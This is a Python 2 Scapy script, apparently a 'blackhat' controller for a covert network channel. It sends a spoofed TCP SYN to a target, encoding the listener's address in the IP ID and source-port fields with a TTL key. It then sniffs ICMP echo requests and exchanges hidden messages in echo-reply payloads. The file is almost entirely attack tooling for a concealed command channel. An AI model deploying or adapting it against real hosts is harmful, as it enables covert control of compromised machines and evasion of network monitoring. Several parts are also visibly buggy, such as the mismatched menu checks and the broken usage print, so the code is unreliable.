#28 Sep 2015
import sys
import time
import random
from scapy.all import *
import socket
import math
global packetsArray
#Maximum transmit size is 40 bytes
MTU = 10
## Helper Functions



#Function takes in IP identification field & TCP source port data as ints, and then deconstructs them
# to construct the IP address
def deconstructIP(IP_id,TCP_sport):

    print "===DECONSTRUCTING IP ADDRESS==="
    print "IP id is " + str(IP_id)
    print "TCP Sport is" + str(TCP_sport)
    #convert to bits
    partition1 = bin(IP_id)[2:].zfill(8)
    partition2 = bin(TCP_sport)[2:].zfill(8)

    # print partition1
    # print partition2

    # print len(partition1)
    # print len(partition2)

    if len(partition1) < 16:
        partition1 = padPartition(partition1)
    if len(partition2) < 16:
        partition2 = padPartition(partition2)




    # print len(partition1)
    # print len(partition2)

    seg1 = partition1[0:8]
    seg2 = partition1[8:16]
        #print "seg1 = " + seg1
        #print "seg2 = " + seg2


    seg3 = partition2[0:8]
    seg4 = partition2[8:16]
        #print "seg3 = " + seg3
        #print "seg4 = " + seg4

    print "IP Address " + str(int(seg1,2))+"."+str(int(seg2,2))+"."+str(int(seg3,2))+"."+str(int(seg4,2))


#If a partition is less than 16 bits (e.g. x.x.0.11 would only show up at as 101100001011), pad with necessary 0s
def padPartition(partition):
    partition = int(partition,2)
    partition = format(partition,'016b')
    return partition


def craftControlPacket(targetIP,listeningIP,spoofedIP, TTLkey):

    #1.A Split first 8 bits of IP address into the IP identification field
    print(listeningIP)

    #1.a Grab the current IP address in bits.
    bits_listIP = socket.inet_aton(listeningIP)
    #convert those bits to integers
    address  = ([ord(i) for i in bits_listIP])
        #DEBUG: print(address)

    #1.b Convert integers into uint8
    bin_listIP = ([bin(i)[2:].zfill(8) for i in address]);
        #DEBUG: print(bin_listIP)

    #1.c Split into IP Identification field data
    # &  TCP Sport data.
    partition1 = bin_listIP[0] + bin_listIP[1]
    partition2 = bin_listIP[2] + bin_listIP[3]
    print partition1
    print partition2

    #1.d Convert the uint8 bits going to each field
    # into integers as expected by Scapy API
    IP_id = int(partition1,2)
    print "IP ID is " + str(IP_id)
        #DEBUG: print partition2

    TCP_sport = int(partition2,2)
    print "TCP Sport is " + str(TCP_sport)

    deconstructIP(IP_id,TCP_sport)

    print "TTL Key is " + str(TTLkey)

    pkt = IP(src=spoofedIP,dst=targetIP, id=IP_id, ttl=TTLkey)/TCP(sport=TCP_sport, dport=80, flags="S")
    # return pkt
    return pkt

def craftReplyPacket(clientIP,localIP,message):
    packet = IP(dst=clientIP,src=localIP)/ICMP(type=0, seq=1)/message
    return packet

def encapsulateMessage(message,numPackets):
    #get length of the message  e.g. (18)
    messageLength = len(message)
    MTU = 10
    packets = numPackets
    letter = 0;
    row = 0
    packetsArray = []

    while letter < messageLength:
            letterStart = letter;
            letterEnd = letter + MTU;
            if letterEnd < messageLength:
                packetsArray.append(message[letterStart:letterEnd])
                letter = letterEnd

            else:
                packetsArray.append(message[letterStart:messageLength])
                letter = messageLength
    print "Inside method " + str(packetsArray)

    packetsArray = packetsArray
    return packetsArray;

def server(packet):
    #print packet.show();

    #EXPECTING HANDSHAKE:
    #Check to ensure that we've received a proper packet (Unknown errors if dont)
    if hasattr(packet.payload, "src") :
        
        print str(packet.payload.src)
        ICMPdata = str(packet.getlayer(Raw))
        paddedData = str(packet.getlayer(Padding))
        localIP = str(packet.payload.dst);
        clientIP = str(packet.payload.src)


        #Handle messages from client

        #INITIAL HANDSHAKE --
        clientMessage = ICMPdata.strip(paddedData)
        clientMessage = clientMessage
        msgPrefix = clientMessage[0:3] 
        #print "MsgPREFIX : " +msgPrefix

        print("DEBUG: CLIENT MESSAGE IS: " + str(clientMessage))

        if clientMessage == "HANDSHAKE":
            print "--HANDSHAKE RECEIVED-- from SRC: " + str(packet.payload.src)

            userInput = input("Connection Established \n"
            + "What would you like to do?"
            +" Enter [1] to SEND, or [2] to RECEIVE \n")

    
            if str(userInput) =="RECEIVE":
                #send a reply blackhat
                send(craftReplyPacket(clientIP,localIP,"HSS[0]"))
                print "HANDSHAKE REPLY sent: BLACKHAT is ready to RECEIVE"

            if str(userInput) =="SEND":
                send(craftReplyPacket(clientIP,localIP,"HSS[1]"))
                print "HANDSHAKE REPLY sent: BLACKHAT is going to SEND"

        #BLACKHAT PUSHING
        if clientMessage == "CRR[1]":
            userInput = input("CLIENT: Ready to receive! \n"
            + "Please enter what message you would like to send the client. \n")

            send(craftReplyPacket(clientIP,localIP,userInput))

        if msgPrefix == "MSG":
            print "CLIENT MSG: " +  str(clientMessage)
            #Send back a standard reply
            send(craftReplyPacket(clientIP,localIP,"MSS[1]"))
        

            # if str(userInput) =="2":
            #     #send a reply blackhat
            #     send(craftReplyPacket(clientIP,localIP,"HSS[0]"))
            #     print "HANDSHAKE REPLY sent: BLACKHAT is ready to RECEIVE"

            # elif str(userInput) =="1":
            #     send(craftReplyPacket(clientIP,localIP,"HSS[1]"))
            #     print "HANDSHAKE REPLY sent: BLACKHAT is going to SEND"



# ============================================ MAIN ========================== #
print 'Number of arguments:', len(sys.argv), 'arguments.'
print 'Argument List:', str(sys.argv)

#Check arguments. Ensure user enters in all information
if len(sys.argv) < 5:
    print "Please enter commands in format:"
    + "python blackhat.py <Mode> <TargetIP> <BlackhatIP> <SpoofedIP> <TTLkey>"
    sys.exit()

#Assign Variables
targetIP = sys.argv[1]
listeningIP = sys.argv[2]
spoofedIP = sys.argv[3]
TTLkey = int(sys.argv[4])



#Program start, blackhat wants to send a control packet to initialize connection.
send(craftControlPacket(targetIP, listeningIP, spoofedIP, TTLkey));
#After the control packet has been sent, the client now has where to reach the
#blackhat server. Program enters into server() state. Blackhat is expecting
# ICMP packets to this address with a code of 8 (ECHO-REQUEST)
sniff(filter="icmp[0]=8 and host "+listeningIP, prn=server)
